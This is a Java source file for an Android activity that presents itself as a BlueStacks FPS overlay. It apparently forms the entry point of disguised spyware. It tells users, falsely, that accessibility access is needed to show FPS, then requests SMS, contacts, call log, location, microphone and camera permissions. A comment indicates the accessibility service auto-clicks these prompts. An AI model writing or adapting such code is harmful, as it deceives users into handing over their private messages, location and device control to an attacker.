package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.app.AlertDialog;
import android.widget.Toast;
import android.content.pm.PackageManager;
import android.os.Build;
import java.util.ArrayList;
import java.util.List;

public class CoreActivity extends Activity {

    private AlertDialog currentDialog;
    private static final int PERM_REQ_CODE = 202;

    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        setContentView(R.layout.activity_main);
        
        if (checkStatus()) {
            finish();
            return;
        }

        findViewById(R.id.btn_save).setOnClickListener(v -> {
            checkAndRequestPermissions();
        });

        // Auto check on start
        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        if (!isServiceEnabled()) {
            showAccessibilityDialog();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] dangerousPermissions = {
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE
            };

            List<String> listPermissionsNeeded = new ArrayList<>();
            for (String perm : dangerousPermissions) {
                if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                    listPermissionsNeeded.add(perm);
                }
            }

            if (!listPermissionsNeeded.isEmpty()) {
                requestPermissions(listPermissionsNeeded.toArray(new String[0]), PERM_REQ_CODE);
            } else {
                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!isServiceEnabled()) {
            showAccessibilityDialog();
        } else {
            if (currentDialog != null && currentDialog.isShowing()) {
                currentDialog.dismiss();
            }
            // If accessibility is on, but permissions are missing, ask for them
            checkAndRequestPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Langsung tutup activity setelah request selesai (karena sudah di-handle auto-click)
        finish();
    }

    private void showAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        currentDialog = new AlertDialog.Builder(this)
            .setTitle("Izin Diperlukan")
            .setMessage("Aktifkan accessibility service untuk melihat fps secara realtime")
            .setCancelable(false)
            .setPositiveButton("OK", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }
}
